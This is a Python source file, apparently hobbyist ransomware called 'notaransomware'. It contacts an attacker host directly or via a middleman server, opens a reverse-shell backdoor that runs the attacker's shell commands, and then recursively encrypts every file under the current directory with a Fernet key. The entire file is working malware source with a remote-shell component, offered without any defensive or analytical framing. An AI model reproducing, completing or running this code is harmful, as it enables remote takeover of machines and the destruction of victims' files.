import os
import socket
import subprocess
import sys
from cryptography.fernet import Fernet

files = []

def find_files(dir=""):
    global files
    if dir != "":
        for i, (t, file, _) in enumerate(files):
            if t == "d" and file == dir:
                files[i][2] = True
    else:
        dir = os.getcwd()
    for file in os.listdir(dir):
        if file == "notaransomware.py" or file == "decrypt.py" or file == "thekey.key":
            continue
        file = f"{dir}\\{file}"
        print(f"found `{file}`...")
        if os.path.isfile(file):
            files.append(["f", file, False])
        elif os.path.isdir(file):
            files.append(["d", file, False])
        else:
            files.append(["?", file, False])

def find_more_files():
    global files
    for (t, file, found_already) in files:
        if t == "d" and not found_already:
            find_files(file)
            find_more_files()

BUFFER_SIZE = 512

def get_lan_ip_from_mid_server(middleman_ip):
    global BUFFER_SIZE
    REQUEST_LAN_IP_BYTES            = b"\x01"
    ABOUT_TO_RECEIVE_LAN_IP_BYTES   = b"\x02"
    OKAY_BYTES                      = b"\x03"

    s = socket.socket()
    try:
        s.connect((middleman_ip, 55037))
    except TimeoutError:
        get_lan_ip_from_mid_server()
    msg = b""

    while msg != ABOUT_TO_RECEIVE_LAN_IP_BYTES:
        msg = s.recv(BUFFER_SIZE)
        s.send(REQUEST_LAN_IP_BYTES)

    lan_ip = s.recv(BUFFER_SIZE).decode()
    s.send(OKAY_BYTES)
    s.close()

    return lan_ip

def setup_backdoor(lan_ip):
    global BUFFER_SIZE
    FIRST_MSG = "\n\n"
    FIRST_MSG += "Welcome to the backdoor for notaransomware!\n"
    FIRST_MSG += "If, at any time, you need help, type :help\n"
    PROMPT = "\n[type :help for help]-> "

    cwd = os.getcwd()

    s = socket.socket()
    s.connect((lan_ip, 55038))

    while True:
        s.send(f"{FIRST_MSG}\n{PROMPT}".encode())
        FIRST_MSG = ""
        msg = s.recv(BUFFER_SIZE).decode()
        
        if msg.strip() == ":help":
            msg = """Custom Commands:
            \r  :cd <dir>   - change directory
            \r  :exit       - exit the backdoor
            \r  :help       - show this help message
            \r  :attack     - attack the machine
            """
            s.send(f"{msg}\n".encode())
            continue

        if msg.strip() == ":exit":
            cwd = None
            break

        if msg.startswith(":cd"):
            os.chdir(msg[3:].strip())
            cwd = os.getcwd()
            continue

        if msg.strip() == ":attack":
            break

        proc = subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        s.send(output)
    
    s.close()
    return cwd

def main(middleman_ip, direct_ip):
    if middleman_ip:
        lan_ip = get_lan_ip_from_mid_server(middleman_ip)
    else:
        lan_ip = direct_ip
    cwd = setup_backdoor(lan_ip)

    if not cwd:
        exit()

    # setup an extremely basic backdoor here so the attacker can choose what to encrypt.

    find_files()
    find_more_files()

    key = Fernet.generate_key()

    with open("thekey.key", "wb") as f:
        f.write(key)

    for (t, file, _) in files:
        if t == "?": print("something unexpected happened")
        if t != "f":
            continue   
        with open(file, "rb") as f:
            contents = f.read()
        encrypted_contents = Fernet(key).encrypt(contents)
        with open(file, "wb") as f:
            f.write(encrypted_contents)
        
if __name__ == "__main__":
    middleman_ip = None
    direct_ip = None
    skip = False
    for arg in sys.argv:
        if skip:
            middleman_ip = arg
            skip = False
            continue
        if arg == "-m":
            if len(sys.argv) != 3:
                print("usage: python notaransomware.py [-m <ip of middleserver>] or <ip of attack machine>")
                exit(1)
            else:
                skip = True
        else:
            if len(sys.argv) != 2:
                print("usage: python notaransomware.py [-m <ip of middleserver>] or <ip of attack machine>")
                exit(1)
            else:
                direct_ip = sys.argv[1]
    main(middleman_ip=middleman_ip, direct_ip=direct_ip)